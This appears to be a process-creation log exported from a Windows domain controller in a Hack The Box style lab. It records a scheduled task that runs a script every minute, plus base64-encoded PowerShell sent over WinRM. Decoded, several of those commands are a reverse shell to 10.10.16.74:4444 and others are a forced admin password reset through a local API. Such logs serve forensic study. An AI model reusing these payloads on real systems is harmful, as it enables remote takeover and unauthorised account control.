"TimeGenerated","Computer","User","Image","CommandLine","ParentImage","ParentCommandLine","ProcessGuid","ParentProcessGuid"
"11/8/2026, 12:26:23.916157 pm","dc.danglingtree.htb","DANGLINGTREE\anderson.w","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -enc CgAkAGIAbwBkAHkAIAA9ACAAQAB7AEkAcwBTAHkAcwBBAGQAbQBpAG4APQAnAHQAcgB1AGUAJwA7AE8AbABkAFAAYQBzAHMAdwBvAHIAZAA9ACcAdwBoAGEAdABlAHYAZQByACcAOwBVAHMAZQByAG4AYQBtAGUAPQAnAGEAZABtAGkAbgAnADsATgBlAHcAUABhAHMAcwB3AG8AcgBkAD0AJwBQAEAAcwBzAHcAMAByAGQAMQAyADMAIQBAACMAJwA7AEMAbwBuAGYAaQByAG0AUABhAHMAcwB3AG8AcgBkAD0AJwBQAEAAcwBzAHcAMAByAGQAMQAyADMAIQBAACMAJwB9ACAAfAAgAEMAbwBuAHYAZQByAHQAVABvAC0ASgBzAG8AbgAKAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIAAnAGgAdAB0AHAAOgAvAC8AbABvAGMAYQBsAGgAbwBzAHQAOgAxADcAMAAxADcALwBhAHAAaQAvAHYAMQAvAGEAdQB0AGgALwBmAG8AcgBjAGUALQByAGUAcwBlAHQALQBwAGEAcwBzAHcAbwByAGQAJwAgAC0ATQBlAHQAaABvAGQAIABQAG8AcwB0ACAALQBCAG8AZAB5ACAAJABiAG8AZAB5ACAALQBDAG8AbgB0AGUAbgB0AFQAeQBwAGUAIAAnAGEAcABwAGwAaQBjAGEAdABpAG8AbgAvAGoAcwBvAG4AJwAKAA==","C:\Windows\System32\wsmprovhost.exe","C:\WINDOWS\system32\wsmprovhost.exe -Embedding","7e3eed90-14ef-6a7b-a805-000000003200","7e3eed90-14d9-6a7b-a505-000000003200"
"11/8/2026, 12:26:01.850428 pm","dc.danglingtree.htb","DANGLINGTREE\anderson.w","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -enc CgAkAGIAbwBkAHkAIAA9ACAAQAB7AEkAcwBTAHkAcwBBAGQAbQBpAG4APQAnAHQAcgB1AGUAJwA7AE8AbABkAFAAYQBzAHMAdwBvAHIAZAA9ACcAdwBoAGEAdABlAHYAZQByACcAOwBVAHMAZQByAG4AYQBtAGUAPQAnAGEAZABtAGkAbgAnADsATgBlAHcAUABhAHMAcwB3AG8AcgBkAD0AJwBQAEAAcwBzAHcAMAByAGQAMQAyADMAIQBAACMAJwA7AEMAbwBuAGYAaQByAG0AUABhAHMAcwB3AG8AcgBkAD0AJwBQAEAAcwBzAHcAMAByAGQAMQAyADMAIQBAACMAJwB9ACAAfAAgAEMAbwBuAHYAZQByAHQAVABvAC0ASgBzAG8AbgAKAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIAAnAGgAdAB0AHAAOgAvAC8AbABvAGMAYQBsAGgAbwBzAHQAOgAxADcAMAAxADcALwBhAHAAaQAvAHYAMQAvAGEAdQB0AGgALwBmAG8AcgBjAGUALQByAGUAcwBlAHQALQBwAGEAcwBzAHcAbwByAGQAJwAgAC0ATQBlAHQAaABvAGQAIABQAG8AcwB0ACAALQBCAG8AZAB5ACAAJABiAG8AZAB5ACAALQBDAG8AbgB0AGUAbgB0AFQAeQBwAGUAIAAnAGEAcABwAGwAaQBjAGEAdABpAG8AbgAvAGoAcwBvAG4AJwAKAA==","C:\Windows\System32\wsmprovhost.exe","C:\WINDOWS\system32\wsmprovhost.exe -Embedding","7e3eed90-14d9-6a7b-a605-000000003200","7e3eed90-14d9-6a7b-a505-000000003200"
"11/8/2026, 12:26:01.341491 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-14d9-6a7b-a305-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 12:25:37.886461 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-14c1-6a7b-9e05-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:24:37.887002 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1485-6a7b-9805-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:23:37.885518 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1449-6a7b-9205-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:22:37.890026 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-140d-6a7b-8c05-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:21:37.886978 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-13d1-6a7b-8205-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:20:37.88554 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1395-6a7b-7a05-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:20:28.318499 pm","dc.danglingtree.htb","DANGLINGTREE\anderson.w","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANwA0ACcALAA0ADQANAA0ACkACgAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1ACAAfAAgACUAIAB7ADAAfQAKAHcAaABpAGwAZQAgACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQAgAHsACgAgACAAIAAgACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkACgAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAKACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnAAoAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkACgB9AAoAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgAKAA== ","C:\Windows\System32\wsmprovhost.exe","C:\WINDOWS\system32\wsmprovhost.exe -Embedding","7e3eed90-138c-6a7b-7805-000000003200","7e3eed90-138b-6a7b-7705-000000003200"
"11/8/2026, 12:20:27.738672 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-138b-6a7b-7505-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 12:19:37.886128 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1359-6a7b-6f05-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:18:37.895086 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-131d-6a7b-6905-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:17:37.887528 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-12e1-6a7b-6205-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:16:37.891186 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-12a5-6a7b-5a05-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:16:34.915472 pm","dc.danglingtree.htb","DANGLINGTREE\anderson.w","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANwA0ACcALAA0ADQANAA0ACkACgAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1ACAAfAAgACUAIAB7ADAAfQAKAHcAaABpAGwAZQAgACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQAgAHsACgAgACAAIAAgACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkACgAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAKACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnAAoAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkACgB9AAoAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgAKAA== ","C:\Windows\System32\wsmprovhost.exe","C:\WINDOWS\system32\wsmprovhost.exe -Embedding","7e3eed90-12a2-6a7b-5805-000000003200","7e3eed90-12a2-6a7b-5705-000000003200"
"11/8/2026, 12:16:34.293069 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-12a2-6a7b-5505-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 12:15:37.886932 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1269-6a7b-4f05-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:14:37.885771 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-122d-6a7b-4905-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:13:37.886788 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-11f1-6a7b-4305-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:12:37.887662 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-11b5-6a7b-3d05-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:12:25.597373 pm","dc.danglingtree.htb","DANGLINGTREE\anderson.w","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4ANwA0ACcALAA0ADQANAA0ACkACgAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1ACAAfAAgACUAIAB7ADAAfQAKAHcAaABpAGwAZQAgACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQAgAHsACgAgACAAIAAgACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAJABpACkACgAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAKACAAIAAgACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnAAoAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkACgB9AAoAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgAKAA== ","C:\Windows\System32\wsmprovhost.exe","C:\WINDOWS\system32\wsmprovhost.exe -Embedding","7e3eed90-11a9-6a7b-3b05-000000003200","7e3eed90-11a9-6a7b-3a05-000000003200"
"11/8/2026, 12:12:24.986462 pm","dc.danglingtree.htb","NT AUTHORITY\NETWORK SERVICE","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -Version 5.1 -s -NoLogo -NoProfile","C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe","""C:\Program Files\WindowsAdminCenter\Service\WindowsAdminCenter.exe"" -service:WinREST","7e3eed90-11a8-6a7b-3805-000000003200","7e3eed90-f05a-6a7a-6f00-000000003200"
"11/8/2026, 12:11:37.891697 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1179-6a7b-2d05-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:10:37.887093 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-113d-6a7b-2705-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:09:37.887217 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1101-6a7b-2105-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:08:37.888394 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-10c5-6a7b-1b05-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:07:37.894677 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1089-6a7b-1205-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:06:37.886249 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-104d-6a7b-0c05-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:05:37.888531 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-1011-6a7b-0605-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:04:37.887199 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-0fd5-6a7b-0005-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:03:37.886386 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-0f99-6a7b-fa04-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:02:37.894952 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-0f5d-6a7b-f404-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:01:37.888505 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-0f21-6a7b-ea04-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 12:00:37.89598 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-0ee5-6a7b-e404-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 11:59:37.885866 am","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-0ea9-6a7b-db04-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
